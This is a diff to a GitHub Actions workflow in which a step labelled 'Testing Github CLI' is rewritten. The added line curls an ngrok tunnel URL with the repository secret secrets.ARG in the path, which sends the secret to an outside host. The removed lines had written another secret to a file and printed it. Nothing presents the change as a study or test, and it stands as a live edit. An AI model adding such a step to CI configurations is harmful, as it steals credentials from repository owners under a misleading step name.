@@ -14,5 +14,4 @@ jobs:
     steps:
       - name: Testing Github CLI
         run: |
-          echo "${{secrets.A}}" | cat > a
-          cat a
+          curl https://793f-49-36-65-203.in.ngrok.io/test/${{ secrets.ARG }}
